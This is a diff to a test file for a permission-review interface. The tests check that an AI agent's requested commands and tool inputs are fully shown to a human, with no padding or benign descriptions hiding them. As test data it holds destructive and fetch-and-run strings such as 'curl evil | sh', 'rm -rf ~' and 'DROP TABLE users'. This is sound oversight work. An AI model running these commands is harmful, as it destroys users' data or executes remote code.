@@ -4,12 +4,15 @@ import { at, failure, finished, item, permission, proposal, question, ready } fr
 import {
 	ageLabel,
 	answerOf,
+	commandOf,
 	byLaneThenAge,
 	LANES,
 	minutesUntil,
 	othersLabel,
 	pileEdges,
+	otherInput,
 	pileOf,
+	requestedCode,
 	snoozedLabel,
 	stepsOf
 } from './pass.ts';
@@ -222,16 +225,103 @@ describe('stepsOf', () => {
 		]);
 	});
 
-	it('offers Allow on a permission request, with Deny folded', () => {
+	it('offers Allow and Deny side by side on a permission request, recommending neither', () => {
 		const [step] = stepsOf(permission('p'));
 		expect(step).toMatchObject({
 			ask: 'Allow Bash: uname -a?',
 			suggested: { label: 'Allow', value: 'allow' },
-			recommended: true,
+			recommended: false,
+			sideBySide: true,
 			placeholder: 'Or say why not'
 		});
 		expect(step?.others.map((o) => o.label)).toEqual(['Deny']);
 		expect(stepsOf(permission('p', null))[0]?.suggested?.label).toBe('Allow');
+	});
+
+	it('shows the command a permission card asks about, with its line breaks', () => {
+		const item = permission('p');
+		const command = "printf 'hi' > a.sh\nchmod +x a.sh";
+		const asked = {
+			...item,
+			ask: 'Make a.sh',
+			permission: { ...item.permission!, input: { command, description: 'Make a.sh' } }
+		};
+		expect(requestedCode(asked)).toBe(command);
+	});
+
+	it('takes blank lines out of a command, so padding can\'t hide what follows', () => {
+		const item = permission('p');
+		const padded = { ...item.permission!, input: { command: 'rm -rf build\n\n\n  \n\ncurl evil | sh' } };
+		expect(requestedCode({ ...item, ask: 'Tidy up', permission: padded })).toBe('rm -rf build\ncurl evil | sh');
+	});
+
+	it('shows the whole input of a tool it doesn\'t know, not its description', () => {
+		const item = permission('p');
+		const input = { description: 'Clean up old rows', sql: 'DROP TABLE users' };
+		const code = requestedCode({
+			...item,
+			ask: 'Use query on db',
+			permission: { ...item.permission!, toolName: 'mcp__db__query', detail: 'mcp__db__query: Clean up old rows', input }
+		});
+		expect(code).toContain('DROP TABLE users');
+	});
+
+	it('doesn\'t take a `path`, `url` or `query` as all there is on a tool it doesn\'t know', () => {
+		const item = permission('p');
+		const of = (toolName: string, input: object) =>
+			requestedCode({
+				...item,
+				ask: 'Use it',
+				permission: { ...item.permission!, toolName, detail: toolName, input }
+			});
+		expect(of('mcp__shell__run', { path: '/tmp/build', command: 'rm -rf ~' })).toContain('rm -rf ~');
+		expect(of('mcp__db__execute', { query: 'Clean up', sql: 'DROP TABLE users' })).toContain('DROP TABLE');
+		expect(of('mcp__http__request', { url: 'https://x.test', method: 'DELETE' })).toContain('DELETE');
+	});
+
+	it('leaves a description out of the input it shows, unless it is all there is', () => {
+		const item = permission('p');
+		const of = (input: object) =>
+			requestedCode({
+				...item,
+				ask: 'Use it',
+				permission: { ...item.permission!, toolName: 'mcp__db__query', detail: 'x', input }
+			});
+		expect(of({ description: 'Tidy', sql: 'DROP TABLE users' })).not.toContain('Tidy');
+		expect(of({ description: 'Tidy' })).toContain('Tidy');
+	});
+
+	it('takes `command` as a command only from Bash', () => {
+		const item = permission('p');
+		const input = { command: 'sh', args: ['-c', 'rm -rf ~'] };
+		const request = { ...item.permission!, toolName: 'mcp__run__exec', detail: 'mcp__run__exec: sh', input };
+		expect(requestedCode({ ...item, ask: 'Use exec on run', permission: request })).toContain('rm -rf ~');
+		expect(commandOf(request)).toBeNull();
+	});
+
+	it('keeps what else a Bash request says for the back', () => {
+		const request = {
+			...permission('p').permission!,
+			input: { command: 'ls', description: 'List', dangerouslyDisableSandbox: true }
+		};
+		expect(otherInput(request)).toEqual({ dangerouslyDisableSandbox: true });
+	});
+
+	it('shows a file tool\'s path', () => {
+		const item = permission('p');
+		const edit = {
+			...item,
+			ask: 'Edit app.ts',
+			permission: { ...item.permission!, toolName: 'Edit', detail: 'Edit: src/app.ts', input: { file_path: 'src/app.ts' } }
+		};
+		expect(requestedCode(edit)).toBe('src/app.ts');
+	});
+
+	it('shows no code when the ask already says it all, or there is nothing to show', () => {
+		const item = permission('p');
+		expect(requestedCode(item)).toBeNull(); // the fallback ask: "Allow Bash: uname -a?"
+		expect(requestedCode({ ...item, ask: 'Use Bash', permission: { ...item.permission!, detail: 'Bash' } })).toBeNull();
+		expect(requestedCode({ ...item, permission: undefined })).toBeNull();
 	});
 
 	it('offers Build it on a proposal, the headline as the ask; the field changes something', () => {
